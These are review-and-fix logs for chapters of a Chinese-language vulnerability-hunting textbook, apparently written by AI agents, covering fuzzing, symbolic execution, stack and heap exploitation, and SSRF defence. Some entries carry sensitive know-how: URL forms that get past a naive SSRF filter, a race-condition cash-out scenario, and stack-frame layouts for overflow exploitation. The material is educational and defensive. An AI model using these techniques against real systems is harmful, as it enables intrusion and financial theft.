3. **Claim**: `"用預設 64 KiB 位圖直接 Fuzzing 超過 10,000 條邊的大型函式庫，導致逾 6–15% 的新邊緣互相覆蓋而漏報。"`
   - **Adjudication**: Valid mathematical alignment with the chapter's own birthday-paradox table. Under the uniform 65,536-slot model, cumulative expected lost-edge ratio is `7.26%` at `E = 10,000` and `20.88%` at `E = 32,000` (exceeding 15%), while the marginal probability that a single new edge lands on an already-occupied slot after `10,000` edges (`~9,274` occupied slots) is `~14.15%`.
   - **Surgical Fix**: Stated both the batch expected collision ratio (`7.26%` to `20.88%` for `10,000`–`32,000` edges) and the marginal slot-occupancy collision probability (`14.15%` at `10,000` edges) in `### 2. 位圖碰撞盲區與過大輸入稀釋吞吐`.
4. **Claim**: `"強制 UBSan 在抓到異常的瞬間發出 SIGABRT 中止行程。"`
   - **Adjudication**: Valid compiler/runtime flag distinction. `-fno-sanitize-recover=all` disables recovery (causing termination on detected UB), while `UBSAN_OPTIONS=halt_on_error=1:abort_on_error=1` (or `AFL_USE_UBSAN=1`) configures the runtime to terminate via `abort()` (`SIGABRT`) so AFL++ classifies it as a crash. Also clarified Self-Check Q3 so the target is compiled with `afl-clang-fast -fsanitize=address,undefined` and actually executes the signed overflow path.
   - **Surgical Fix**: Updated the UBSan section and Self-Check Q3/A3 to distinguish `-fno-sanitize-recover=all` from `abort_on_error=1` (`SIGABRT`) and specified `afl-clang-fast` plus path execution in Q3.

### High-Value `imprecise` Findings Resolved & Remaining Dismissals
- **Resolved**: Clarified hit-count bucket novelty (a seed is saved when a slot exhibits a bucket bit never seen in any prior execution); fixed the `E = 4,000` table entry from `~100.00% (e^-122)` to `~100% (1-e^-122)` (preserving exact 19-char column width) since `e^-122` is the no-collision probability.
- **Dismissed**: Closed-book requests for live benchmark logs on ASan/MSan CPU multipliers or discovery times.

---

## 5. `ch30-symbolic-execution-and-hybrid-fuzzing.md`

### `incorrect` Findings Adjudicated & Fixed (7/7)
1. **Claim**: `"無放回隨機排列平均嘗試次數（50% 候選空間）：2^31 = 2,147,483,648 次。"`
   - **Adjudication**: Genuine discrete-probability off-by-0.5 distinction. In a uniform random permutation of `N = 2^32` items without replacement, `2^31 = 2,147,483,648` is the exact 50% cumulative hit threshold, while the expected number of trials (including the winning trial) is `(N + 1) / 2 = 2,147,483,648.5`.
   - **Surgical Fix**: Updated the worked example line to state both the 50% cumulative hit threshold (`2^31 = 2,147,483,648`) and the exact expected trial count (`(2^32 + 1)/2 = 2,147,483,648.5`), both corresponding to `~4.97 天` at `5,000 exec/s`.
2. **Claim**: `"面對 if (checksum(pkt) == pkt->csum)，無論位元翻轉或 Havoc 變異，單次成功機率都只有 2^-32。"`
   - **Adjudication**: Valid probabilistic model qualification. `2^-32` is the single-trial hit probability under uniform independent sampling over the 32-bit checksum space (whereas deterministic single-bit flips from a distant seed have `0` probability of hitting the unique valid 32-bit checksum).
   - **Surgical Fix**: Qualified the `2^-32` figure with the uniform independent sampling model and noted the zero hit rate of single-step bit flips when Hamming distance > 1.
3. **Claim**: `"magic == 0x4E58（'NX'）、type == 0x0013、len == 12。"`
   - **Adjudication**: Valid endianness clarification. The 16-bit integer `0x4E58` has high byte `0x4E` (`'N'`) and low byte `0x58` (`'X'`), which serializes in little-endian wire order as `58 4e` (`"XN"`).
   - **Surgical Fix**: Clarified high/low ASCII bytes (`'N'`, `'X'`) and little-endian wire bytes (`58 4e`, `"XN"`).
4. **Claim**: `"低 16 位元經過 + 8 後必須回繞小於 4，而漏洞點恰巧就是後續用這個截斷後的低 16 位元計算緩衝區索引。"`
   - **Adjudication**: Valid consistency fix between prose and reference C code (`nexus_tlv_sym.c`). In `trigger_overflow`, the truncated low 16-bit value `((amount_delta + 8) & 0xFFFF)` is used as the `malloc(alloc_sz)` allocation size (`1–3 bytes`) prior to a fixed `8`- or `16`-byte `memcpy`, not as an array index.
   - **Surgical Fix**: Updated item 3 in the worked example to state `作為 malloc 配置尺寸（僅配置 1–3 bytes 緩衝區卻複製 8 或 16 bytes 固定長度標記資料）`.
5. **Claim**: `"切勿直接寫 sym_len <= 65536，否則有號比較會放行最高位元為 1 的超大無號長度。"`
   - **Adjudication**: Genuine API distinction between Claripy and Z3Py. In Z3Py, `<=` on `BitVec` defaults to signed comparison (`SLE`), whereas in Claripy, `<=` on `BVS` defaults to unsigned (`ULE`).
   - **Surgical Fix**: Clarified in Failure Mode #1 that while Claripy `BVS` `<=` defaults to unsigned, raw Z3Py `BitVec` `<=` defaults to signed (`SLE`), so explicitly calling `claripy.ULE(sym_len, 65536)` / `z3.ULE` prevents cross-API signedness bugs.
6. **Claim**: `"把 SHA-256 的 64 輪壓縮函式轉成 Z3 BitVec 公式並求逆像，等價於用通用 SAT 求解器暴力破解密碼學雜湊，會在 solver 內部造成指數級別的計算凍結。"`
   - **Adjudication**: Valid theoretical refinement. Bit-blasting to CNF SAT does not make CDCL search literally identical to brute-force enumeration, though inverting full 64-round SHA-256 over hundreds of thousands of coupled boolean clauses practically causes solver timeouts.
   - **Surgical Fix**: Rephrased to describe bit-blasting into hundreds of thousands of coupled boolean clauses for a cryptographic one-way hash, causing practical CDCL solver timeouts.
7. **Claim**: `"先用 clang -fsanitize=address -g nexus_tlv_sym.c -o nexus_tlv_sym_asan 編譯供驗證崩潰與 AFL++ 使用。"`
   - **Adjudication**: Valid build-command consistency fix. Plain `clang -fsanitize=address` has no AFL++ coverage instrumentation; the reference solution compiles both `nexus_tlv_sym_asan` (with `clang`) and `nexus_tlv_sym_afl` (with `afl-clang-fast`).
   - **Surgical Fix**: Updated Lab Step 2 to list both the `clang` command (`nexus_tlv_sym_asan` for standalone ASan crash verification) and the `afl-clang-fast` command (`nexus_tlv_sym_afl` for AFL++ fuzzing).

### High-Value `imprecise` Findings Resolved & Remaining Dismissals
- **Resolved**: Specified that the 32-bit checksum covers `magic`, `type`, `flags`, and `amount_delta`; unified the foreign sync directory path `-F sym_foreign` across prose, lab instructions, and reference commands; added `s.add(((amount_delta + 8) & 0xFFFF) == 1)` in `solve_tlv_z3.py` so the script deterministically outputs `amount_delta = 0x0001fff9` (`alloc_sz = 1 byte`) matching the prose walkthrough.
- **Dismissed**: Closed-book citation checks on SymCC (USENIX Security 2020), SymQEMU (NDSS 2021), QSYM (USENIX Security 2018), and angr v10 metadata (all verified against `_meta/landscape-2026-11.md`).

---

## Verification Gate Results
- `lint_book.py`: **0 errors, 0 warnings** across all chapters.
- `check_diagrams.py`: **`{"passed": true, "findings": []}`** (0 misaligned diagrams).


<!-- source: verify-log-r2-slice-6.md -->
# Round-2 Tier-2 Adjudication Log — Slice 6 (Ch31, Ch32, Ch34, Ch36, Ch37)

- **Reviewer Panel**: `codex:gpt-6.2-sol:medium`
- **Adjudicator**: `p4-r2-6` (`gemini-4-argon-medium`)
- **Chapters Covered**:
  - `ch31-real-world-oss-fuzzing.md`
  - `ch32-chaining-ai-and-0day-workflow.md`
  - `ch34-appsec-engineering-and-sdlc.md`
  - `ch36-security-career-and-interviews.md`
  - `ch37-certifications-and-proof-of-work.md`

---

## 1. `ch31-real-world-oss-fuzzing.md`

| # | Finding / Claim | Panel Verdict | Adjudication Decision | Surgical Fix Applied |
|---|---|---|---|---|
| 1 | C/C++ 缺少語言級邊界檢查，任意指標偏移或整數溢位直接轉化為記憶體損毀 | `incorrect` | **Accepted** | 修正表格敘述為：C/C++ 原生指標與陣列操作通常缺少自動邊界檢查，錯誤偏移或整數溢位若影響後續配置大小、索引或拷貝長度，便可能造成記憶體損毀。 |
| 2 | 發生在未插樁函式庫內部的越界讀寫將因缺少編譯期檢查探針而漏檢 | `incorrect` | **Accepted** | 明確指出未插樁程式碼中的直接越界讀寫會因缺少編譯期探針而形成 ASan 檢測缺口（除非經由 ASan 攔截的標準函式或後續觸發其他可觀察錯誤，否則直接指令存取可能漏檢）。 |
| 3 | 在改寫建置腳本時，必須遵守三條硬性原則：強制靜態建置受測庫與關閉測試 | `incorrect` | **Accepted** | 釐清核心目的為確保受測庫與需一併驗證的核心相依元件以匹配的插樁與 Sanitizer 旗標編譯為靜態封存檔鏈入 Fuzzer（避免執行期誤載系統未插樁共用函式庫），並視建置需求關閉無關測試以縮短建置時間。 |
| 4 | `build.sh` 在容器建置期由基底環境執行 | `incorrect` | **Accepted** | 修正為在建立 Fuzzer 產物的容器執行階段（如執行 `build_fuzzers` 時）由基底環境呼叫，與後文 `build_image` / `build_fuzzers` 兩階段流程完全一致。 |
| 5 | 在啟用 ASan 的插樁建置下，該輸入緩衝區後方通常緊鄰 ASan 紅區，只要越過 `size` 多讀 1 byte 就會觸發 ASan 越界告警 | `incorrect` | **Accepted** | 明確區分 API 長度契約與 ASan 紅區配置：讀取 `size` 之外已超出 API 契約；在 libFuzzer 搭配 ASan 為單次輸入配置剛好 `size` bytes 獨立堆積緩衝區時，其尾端緊鄰 ASan 紅區，已插樁函式越過 `data + size` 踏入紅區即觸發告警。 |
| 6 | 放入小型合法種子至 `corpus_p2`（尾端附 4 bytes 供 `FuzzedDataProvider` 切分控制參數） | `incorrect` | **Accepted (Code Bug Fixed)** | `fuzz_advanced.cc` 依序消費 `uint16_t` (2B) + `uint8_t` (1B) + `bool` (1B) + `bool` (1B) 共 `5 bytes` 控制區。已將 `size < 4` 修正為 `size < 6`（5B 控制區 + 至少 1B 負載），並將 `seed0.bin` 尾端控制區補齊為 5 bytes（`\x01\x00\x01\x01\x00`），避免最後一次 `ConsumeBool()` 吃掉 JSON 結尾 `}`。 |
| 7 | 以 `MemorySanitizer`（MSan）或 ASan 檢查是否存在未初始化記憶體讀取，並透過二分法刪減前置輸入序列 | `incorrect` | **Accepted** | 區分 MSan（查核未初始化記憶體讀取）與 ASan（查核越界與記憶體生命週期違規）之職責，並註明在維持必要先後順序下逐步縮減前置輸入序列且於每次刪減後驗證崩潰重現。 |
| 8 | Phase 1 標題「往返序列化」、`.github/workflows/cflite_pr.yml` 缺少 `checkout`、6-byte 盲猜年數四捨五入精度 | `imprecise` | **Accepted (Refined)** | 將 Phase 1 標題精確化為「解析後序列化寫出」；於 `cflite_pr.yml` 補上 `actions/checkout@v4`；於自我檢核第 2 題補充有放回 `1,785.10 年` 與不放回 `(2^48 + 1) / 2` 約 `892.55 年`（四捨五入約 `893 年`）之精確推導。其餘純封閉式外部背景挑剔予以駁回。 |

---

## 2. `ch32-chaining-ai-and-0day-workflow.md`

| # | Finding / Claim | Panel Verdict | Adjudication Decision | Surgical Fix Applied |
|---|---|---|---|---|
| 1 | 嘗試次數: `16,777,216 -> 1` | `incorrect` | **Accepted** | 明確標註 `16,777,216` 為 `10.0.0.0/8` 網段的 IPv4 候選位址數（`10.0.0.0/8 候選 IP: 16,777,216 -> 1`），F1 同時揭露確切內網 IP、埠號與兩條內部路徑，消除目標位址盲猜，並將攻擊圖起點明確標為「持有低權限商戶帳號之外部攻擊者」。 |
| 2 | 只要順著邊界轉移，就能在 `20` 次併發內把 `$100.00` 帳戶變現出 `$2,000.00`（超額損失 `$1,900.00`） | `incorrect` | **Accepted** | 明確限定在該內部端點未加原子鎖與資料庫非負餘額約束的競爭情境下，單輪 `20` 次併發全部成功提交時的總出金上界為 `$2,000.00`（淨超額損失上界 `$1,900.00`）。 |
| 3 | 可搭配 `git log -n 1 --tail` 確認 `--depth 300` 已完整涵蓋 90 天區間 | `incorrect` | **Accepted (CLI Fix)** | `git log` 無 `--tail` 旗標。已修正為使用 `git clone --shallow-since="90 days ago"` 或以 `git log --reverse -n 1 --format="%h %ci"` 確認本地最舊提交時間早於 90 天前（若截斷則用 `git fetch --shallow-since="90 days ago"` 補齊）。 |
| 4 | `P_i` 輸出狀態補齊 `P_j` 前置條件與 Nginx `30 s` / Node.js `5 s` 逾時階段區分 | `imprecise` | **Accepted (Refined)** | 補充下游節點可由單一或多個前序節點加初始環境共同滿足，並明確區分上游讀取間隔逾時（Nginx `proxy_read_timeout = 30 s`）與後端持久連線回應後閒置逾時（Node.js `keepAliveTimeout = 5 s`）。其餘純語氣與封閉式史料挑剔予以駁回。 |

---

## 3. `ch34-appsec-engineering-and-sdlc.md`

| # | Finding / Claim | Panel Verdict | Adjudication Decision | Surgical Fix Applied |
|---|---|---|---|---|
| 1 | 強制從已驗證的請求上下文取得 `tenantId`，自動執行 `SET LOCAL app.current_tenant_id = $1` | `incorrect` | **Accepted** | 對齊正文、步驟說明與 `tenant-db.ts` 參考實作：明確說明呼叫端須傳入經認證與租戶授權中介層產出的 `AuthContext`（校驗 `tenantId` 非空），並於同一連線交易內執行參數化的 `SELECT set_config('app.current_tenant_id', $1, true)`（等效於交易作用域內的 `SET LOCAL`）。 |
| 2 | 僅允許 `https:`（或明確核准的 `http:`）與標準埠號 `80`/`443` | `incorrect` | **Accepted (Code & Prose Aligned)** | 於 `safe-http.ts` 強制檢查協定與其標準埠號之一對一配對（`https:` 必須為 `443`、`http:` 必須為 `80`），並使正文與程式碼一致。 |
| 3 | 參考實作可在 Node.js 22 執行，並以自訂 `lookup` 強制回傳已驗證 IP | `incorrect` | **Accepted (Code Bug Fixed)** | Node.js 22 在 `autoSelectFamily` / `{ all: true }` 模式下呼叫自訂 `lookup` 時要求回傳 `[{ address, family }]` 陣列。已更新 `safe-http.ts` 的 `lookup` 回呼，同時支援 `opts.all === true` 陣列格式與單一位址格式。 |
| 4 | 嚴重（Critical）表列條件包含「EPSS ≥ 0.1 / 列入 CISA KEV 觸發立即處置且確認具實質可達曝險」，與高危列 `7 天` SLA 條件重疊 | `incorrect` | **Accepted** | 重構風險分級表：明確由 CVSS v4.0 與實質業務破壞面決定嚴重度與修復 SLA（嚴重 `24 小時`、高危 `7 天`），而 `EPSS ≥ 0.1` 或列入 `CISA KEV` 則作為**立即啟動分診與處置**的觸發條件，消除漏洞 B（CVSS 7.8、EPSS 0.18）在表格中同時命中 `24 小時` 與 `7 天` 的邏輯衝突。 |
| 5 | `nexuspay-no-raw-pool-query` 禁止在 `src/services/` 下直接呼叫 `pool.query(...)` | `incorrect` | **Accepted** | 釐清 Semgrep 規則 `$POOL.query(...)` 會攔截 `src/services/` 下對連線池或用戶端物件的 `.query(...)` 呼叫，而合規的 `TenantDbClient` 僅暴露 `queryScoped(...)`，使規則語義與說明完全一致。 |
| 6 | 自我檢核第 1 題：DNS Rebinding 前置條件與 WHATWG `new URL()` 對十六進位 IPv4 之正規化行為 | `incorrect` | **Accepted** | 修正自我檢核第 1 題參考解答：(1) 指出僅檢查 `URL.hostname` 字串連一般自訂網域指向私網 IP 都無法攔截，且即便加上預檢也會被 DNS Rebinding 擊穿；(2) 指出 WHATWG `new URL()` 會將 `http://0x7f000001/` 正規化為 `127.0.0.1`，但對於 IPv6 迴路／映射位址（`[::1]`、`[::ffff:127.0.0.1]` 正規化為 `[::ffff:7f00:1]`）以及未列入三前綴的 `169.254.169.254`（含十進位 `2852039166`）、`172.16.0.0/12`、`0.0.0.0/8` 仍會直接放行。 |

---

## 4. `ch36-security-career-and-interviews.md`

| # | Finding / Claim | Panel Verdict | Adjudication Decision | Surgical Fix Applied |
|---|---|---|---|---|
| 1 | 任務二參考解答 SLA 分流：將「CVSS 高分 + EPSS ≥ 0.1」直接等同於 24 小時 SLA 並無條件輪換雲端憑證，將未利用的報表欄位跳脫缺陷直接歸為 7 天高危 SLA | `incorrect` | **Accepted** | 修正任務二 SLA 分流說明：先依前置條件與實質影響以 CVSS v4.0 定級，凡搭配 `EPSS ≥ 0.1` 或列入 `CISA KEV` 即觸發立即處置；確認達**嚴重**（Critical）等級者啟動 `24 小時` 嚴重 SLA 並於確認雲端憑證有曝險證據時撤銷與輪換憑證；經評定屬**高危**（High）等級者則納入 `7 天` 高危 SLA 修補並補上 CI 測試。 |
| 2 | 反向代理 `proxy_read_timeout = 30 s` 與後端 `keepAliveTimeout = 5 s` 不匹配時連線池重用問題 | `imprecise` | **Accepted (Refined)** | 明確區分反向代理的上游讀取逾時（`proxy_read_timeout = 30 s`）與後端持久連線閒置逾時（`keepAliveTimeout = 5 s`），並指明連線重用關閉競爭源於代理上游連線池閒置期限與後端 `keepAliveTimeout` 不匹配。 |

---

## 5. `ch37-certifications-and-proof-of-work.md`

| # | Finding / Claim | Panel Verdict | Adjudication Decision | Surgical Fix Applied |
|---|---|---|---|---|
| 1 | 自費買 SANS 官方課現金成本極高；除非由雇主全額報帳，否則個人自費負擔遠高於 BSCP＋OSWE | `incorrect` | **Accepted** | 修正表格敘述：無補助自費購買 SANS 官方課時現金成本極高（`$8,700+` 為 BSCP＋OSWE 合計 `$2,347` 的 `3.7` 倍以上）；除非獲得雇主高額或全額補助（以 `$8,700` 下限計，補助須超過 `$6,353` 自付額才會低於無補助的 BSCP＋OSWE），否則個人自費負擔顯著偏高。 |
| 2 | 參考解答 6 個月藍圖：**Month 3–4（120h / $0）** 在固定每週 `12 小時` 下無法容納於 2 個月（約 8.67 週 = 104h）內 | `incorrect` | **Accepted (Math Fixed)** | 將 26 週（`26 週 × 12h/週 = 312 小時`）藍圖改以精確對齊 `12h/週` 的三段連續週次呈現：**Weeks 1–6（6 週共 72h / $598 USD：68h 實驗 + 4h BSCP 應試）**、**Weeks 7–16（10 週共 120h / $0）**、**Weeks 17–26（10 週共 120h / $0）**，三階段合計 `6 + 10 + 10 = 26 週`、`72 + 120 + 120 = 312 小時`。 |
| 3 | Portfolio A（90h 未列正式應試 3h）與 Portfolio D（180h 內 132h 訓練 + 47h 45m 考試僅剩 15 分鐘寫報告）工時細項 | `imprecise` | **Accepted (Math Refined)** | 於 Portfolio A 明列 `Index 製作、模擬考與正式應試（約 3h）共 90h`；於 Portfolio D 明列 `120h 訓練 + 47h 45m 應試 + 12h 15m 報告撰寫 = 180h`（加上 `60h` 作品共 `240h`）。 |

---

## 6. Verification Gate Results

- `lint_book.py`: 0 errors, 0 warnings across all 5 chapters in `slice-6`.
- `check_diagrams.py`: 0 errors, 0 warnings across all 5 chapters in `slice-6`.


<!-- source: verify-log-r2-slice-new2.md -->
# P4 Round-2 跨模型審查裁決與外科修補日誌（Slice New2: Ch22, Ch24, Appendix-A）

- **審查面板**：`codex:gpt-6.2-sol:medium`（Round-2 快取：`books/vuln-hunting/book-src/_meta/review-sol62-medium-cache/`）
- **負責範圍**：
  1. `ch22-stack-overflow-and-rop.md`（快取：`ch22-stack-overflow-and-rop.json`）
  2. `ch24-advanced-heap-and-allocators.md`（快取：`ch24-advanced-heap-and-allocators.json`）
  3. `appendix-a-lab-index.md`（全書 37 章完稿狀態同步）
- **基準核對**：全數嚴格對齊 `_meta/running-examples.md` 全書基準數字表，零變更基準常數。

---

## 1. `ch22-stack-overflow-and-rop.md`

### `verdict == "incorrect"` 裁決與修補（7 項全數修正）

1. **高階語言邊界保護與呼叫堆疊隔離的描述精確化**
   - **審查意見**：語言層存取規則無須依賴回傳位址與區域變數分開存放；JavaScript / TypeScript 越界讀取多得 `undefined`，Go 與 Rust 的受檢查索引才通常觸發 panic。
   - **裁決與修補**：成立。修訂第 11 行，明確說明高階語言由執行環境與編譯器維護抽象與邊界，區分 JS/TS 越界讀取（回傳 `undefined`）與 Go/Rust（觸發 panic），避免將抽象隔離表述為實體記憶體分區。
2. **行程異常終止、訊號交付與連鎖雪崩的因果邊界**
   - **審查意見**：`#CP` 為 CPU 異常，行程是否終止取決於作業系統訊號交付與預設處置；服務層是否連鎖雪崩取決於重試、流量隔離與容錯策略，非必然單向因果。
   - **裁決與修補**：成立。修訂第 30 行，明確說明 `__stack_chk_fail()`（觸發 `SIGABRT`）與 `#CP`（Linux 使用者態通常交付為 `SIGSEGV`）之預設終止行為，並將服務層雪崩限定於缺乏請求隔離或容錯降級之場景。
3. **Worked Example 堆疊幀絕對位址與局部配置位移修正**
   - **審查意見**：呼叫前 `RSP = 0x7fffffffdd00`，`call` 與 `push rbp` 共消耗 16 bytes，`RBP` 應為 `0x7fffffffdcf0`；局部配置 `0x50`（80 bytes）後配置區低端應為 `0x7fffffffdca0`。原表 `RBP` 誤植為 `dce0`，相差 `0x10`。
   - **裁決與修補**：成立。全面重算並更新 Worked Example 堆疊幀分佈表：
     - `0x7fffffffdca0 - dca7` [rbp - 0x50]：對齊填充 / 區域長度變數（8 bytes）
     - `0x7fffffffdca8 - dce7` [rbp - 0x48]：`buf[0..63]`（64 bytes）
     - `0x7fffffffdce8 - dcef` [rbp - 0x08]：Stack Canary（8 bytes）
     - `0x7fffffffdcf0 - dcf7` [rbp + 0x00]：Saved RBP（8 bytes）
     - `0x7fffffffdcf8 - dcff` [rbp + 0x08]：Saved RIP（8 bytes）
     - 驗算：`0x7fffffffdcf8 - 0x7fffffffdca8 = 0x50`（80 bytes），總幀長 `96 bytes`（16-byte 對齊），完全自洽。
4. **`memcpy` 越界行為之規範與編譯產物表述**
   - **審查意見**：超過物件大小之複製屬於 C 未定義行為，標準未保證循序寫入順序，不可直接以 C 源碼保證逐位元組覆寫結果。
   - **裁決與修補**：成立。修訂第 75 行，明確標明為「在上述典型堆疊排列與常見循序拷貝產物下」，指出超過 64 位元組即構成未定義行為的越界寫入，並分析其接連覆寫 Canary 與回傳位址之結構風險。
5. **System V AMD64 ABI 引數暫存器分類規範**
   - **審查意見**：`RDI..R9` 暫存器序列僅適用於整數類（INTEGER class）引數，浮點數使用 SSE 向量暫存器（`XMM0..XMM7`），引數序號無法單獨決定暫存器。
   - **裁決與修補**：成立。修訂第 82 行，補充「整數類（INTEGER class，如整數與指標）」之 ABI 分類前提，並補充浮點引數依 SSE 規則使用 XMM 暫存器。
6. **Stack Canary 模式範圍與保護條件修訂**
   - **審查意見**：`-fstack-protector` 亦保護含 `alloca` 之函式；`-fstack-protector-strong` 擴大至區域陣列與取址變數；Canary 偵測的是函式尾聲比對時之差異，非僅「連續寫入」。
   - **裁決與修補**：成立。修訂第 104–105 行，精確闡述基本模式（字元陣列門檻與 `alloca`）與 strong 模式（區域陣列、結構體陣列、框架取址變數）之觸發規則，並將失效邊界精準定義為「跳過 Canary 的不連續索引寫入，或洩漏原值後精確寫回」。
7. **硬體防禦表頭語意修正與動手做反組譯特徵對齊**
   - **審查意見**：Shadow Stack 與 PAC 於 `ret` 或指標使用時驗證，並非阻擋一般資料寫入；動手做編譯指令同時含 Canary、CET 與 FORTIFY，解答編號遺漏第三項特徵。
   - **裁決與修補**：成立。
     - 修訂第 127 行總表欄位為「能否在 ret / 間接分支時阻斷被竄改的控制流」，明確標示 Shadow Stack 與 PAC 的攔截時機。
     - 修訂動手做第 191 行文字為「Canary + CET + FORTIFY」對照組，並在參考解答補齊三大防禦特徵（`endbr64` 著陸標記、`fs:0x28` Canary 比對、`__memcpy_chk@plt` 強化呼叫）。

### 關鍵 `imprecise` 補強
- **W^X 分頁政策與典型權限**（第 3 行）：明確標明分頁層級原則與典型 R-X / RW- 映射。
- **NX 防禦邊界**（第 16 行）：明確阻斷「Shellcode 注入堆疊」與既有可執行映射區段重用。
- **格式字串缺陷未定義行為與洩漏機制**（第 84 行）：明確區分缺少實參的未定義行為與 ABI 讀取殘留暫存器／堆疊之現象。
- **`_FORTIFY_SOURCE=3` 條件與模式**（第 94–97 行）：標明 GCC 12 / Clang 9 與 glibc 2.34+ 動態大小推導、`(size_t)-1` 未知大小退化行為。

---

## 2. `ch24-advanced-heap-and-allocators.md`

### `verdict == "incorrect"` 裁決與修補（7 項全數修正）

1. **自訂配置器掛載途徑的非唯一性**
   - **審查意見**：移除舊全域鉤子後，除 ELF 符號介入（`LD_PRELOAD`）外，程式亦可在原始碼層直接呼叫自訂配置 API 或透過連結期指定符號。
   - **裁決與修補**：成立。修訂第 44 行，補充「除可在原始碼層直接呼叫自訂配置 API 或透過編譯器連結期指定符號外，亦可透過標準的 ELF 符號介入進行全域攔截」。
2. **`IO_validate_vtable` 邊界防護與慢速相容路徑表述**
   - **審查意見**：`IO_validate_vtable` 檢查失敗後交由慢速相容路徑處理，未通過時才終止；唯讀區段能防禦一般遵守權限的寫入，不應表述為「任何寫入原語」。
   - **裁決與修補**：成立。修訂第 62 行，改為「大幅縮減了偽造堆積 vtable 的利用空間：由於 `__libc_IO_vtables` 位於唯讀資料區段（`R--`），一般的可寫記憶體寫入原語無法修改該區段內的函式指標；若指標落在區段外，慢速路徑未通過相容驗證便會直接終止行程」。
3. **CVSS v4.0 完整向量與 EPSS 分數定義對齊**
   - **審查意見**：漏洞評級須提供完整 CVSS v4.0 向量（含權限、使用者互動等）；基準常數定義的是 EPSS 分數（`≥ 0.1`），非「百分位」。
   - **裁決與修補**：成立。修訂第 31 行，補齊完整 CVSS v4.0 向量範例（`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N`），並將「EPSS 百分位」嚴格修正為「EPSS 分數（`≥ 0.1`）」。
4. **VMA 數量上限（`vm.max_map_count`）的作用範圍與防護頁機制**
   - **審查意見**：`vm.max_map_count` 是單一行程的 VMA 上限，不能將多個服務的 VMA 累積相加；權限變更可能分割或合併 VMA。
   - **裁決與修補**：成立。修訂第 178 行，明確說明 Linux 核心對單一行程的 VMA 數量上限，分析原生服務建立大量執行緒與區段防護頁時導致單一行程 VMA 分割攀升並逼近上限之風險。
5. **PROT_NONE 防護頁與實體 RSS 增幅的獨立衡量**
   - **審查意見**：PROT_NONE 描述虛擬存取權限，無法直接推出實體 RSS 增幅；RSS 增幅主要受內部碎片、帶外中繼資料與快取保留影響。
   - **裁決與修補**：成立。修訂第 151–153 行，將虛擬位址區間／VMA 增加與實體常駐記憶體（RSS）增長分別精準說明。
6. **跨配置器釋放的 chunk 標頭偏移與未定義行為本質**
   - **審查意見**：ptmalloc2 的 chunk 起點在 `mem - 0x10`，`mchunk_size` 在 `mem - 0x08`；跨配置器釋放違反配對契約，屬於未定義行為，無法保證單一固定中止訊息。
   - **裁決與修補**：成立。修訂第 184 行，精確標示 `mem - 0x10` 起點與 `mem - 0x08` 的 `mchunk_size` 欄位，明確指出跨配置器釋放違反契約，通常因大小或對齊檢查失敗觸發 abort（如 `munmap_chunk(): invalid pointer` 或 `corrupted size`）。
7. **動手做命令列參數名稱與 1-byte 越界語意修正**
   - **審查意見**：`alloc_bench.c` 接受的參數為 `double-free` 與 `oob`（非 `uaf-double-free` / `oob-write`）；故障模式未記錄時間延遲，而是觀察攔截時機；`a[24]` 是越界寫入，預設通過是因為落在對齊填充區。
   - **裁決與修補**：成立。
     - 修訂第 202、225、227 行任務目標與操作檢查點，將命令列參數精確同步為 `double-free` 與 `oob`，並修正為「觀察不同配置器下的攔截時機與診斷表現」。
     - 修訂第 343 行，明確說明對 24-byte 緩衝區寫入 `a[24]` 為越界寫入，預設 glibc 常因落在對齊填充區而靜默通過，ASan 則由插樁命中 Redzone 立即攔截。

### 關鍵 `imprecise` 補強
- **前言背景與章節定位**（第 5 行）：補充「閘道尖峰吞吐需求 `2,000 req/s`」，並精確交代本地容器基準測試提供之驗證程序與對照目標。

---

## 3. `appendix-a-lab-index.md`

### 完稿狀態同步與架構標籤移除
- 配合全書 37 章全數完稿，將第 119 行說明更新為全書 37 章完整實驗配置。
- 將 Part IV 與 Part VI 中原標註之 `[尚未完稿預留章節]`（`Ch22, Ch23, Ch24, Ch26, Ch27, Ch33, Ch35`）全數更新為 **`已完稿`**，並移除難度欄位中的「（規劃）」後綴，保持全書附錄與章節完成狀態完全一致。

---

## 4. 驗證與閘門結果

- `python3 tools/md-reader/lint_book.py books/vuln-hunting/book-src --lang zh-TW --config books/vuln-hunting/book-src/_meta/lint.config.json`：
  - `ch22-stack-overflow-and-rop.md`：**0 errors, 0 warnings**
  - `ch24-advanced-heap-and-allocators.md`：**0 errors, 0 warnings**
  - `appendix-a-lab-index.md`：**0 errors, 0 warnings**
- `python3 tools/md-reader/check_diagrams.py books/vuln-hunting/book-src`：**passed (0 findings)**
- 所有全書基準常數、6 個 H2 標題、首個 H3、難度／時間／參考解答格式均 100% 嚴格保留。


<!-- source: verify-log-r2-slice-new5.md -->
# P4 Round-2 Adjudication & Surgical-Fix Log — `slice-new-5`

- **Agent**: `p4-final-3` (`gemini-3.8-flash-high`)
- **Reviewer Cache**: `books/vuln-hunting/book-src/_meta/review-sol62-medium-cache/` (`codex:gpt-6.2-sol:medium` / `argon-low`)
- **Assigned Slice (`slice-new-5`)**:
  1. `ch23-heap-internals-and-primitives.md`
  2. `ch26-jit-type-confusion-and-ubercage.md`
  3. `ch27-linux-kernel-exploitation.md`
  4. `ch33-disclosure-and-bug-bounty.md`
  5. `ch35-nexuspay-red-blue-capstone.md`
- **Verification Gates**:
  - `python3 tools/md-reader/lint_book.py books/vuln-hunting/book-src --lang zh-TW --config books/vuln-hunting/book-src/_meta/lint.config.json` → **PASS** (37 chapters, 0 errors, 0 warnings)
  - `python3 tools/md-reader/check_diagrams.py books/vuln-hunting/book-src` → **PASS** (0 findings)

---

## 1. `ch23-heap-internals-and-primitives.md`

### `incorrect` Findings Adjudicated & Surgically Fixed (17/17)
1. **Claim [1]**: `"區域變數隨著函式進入而壓入堆疊、隨著 ret 返回而自動收回，記憶體位址與生命週期都受限於單一呼叫鏈。"`
   - **Adjudication**: Valid distinction. Automatic local variables have lifetime and scope tied to function activation; compiler optimizations may keep them in registers or eliminate storage, and stack frame epilogue teardown occurs prior to `ret` popping the return address.
   - **Surgical Fix**: Reworded to specify local variables with automatic storage duration (`具有自動儲存期的區域變數隨著函式呼叫建立框架、隨著尾端清理與返回而失效`).
2. **Claim [2]**: `"當 libnexus-parse 必須同時處理多筆長度最高可達 65,536 bytes（64 KiB）的 TLV 封包……這些物件只能由動態記憶體配置器在堆積上配置與釋放。"`
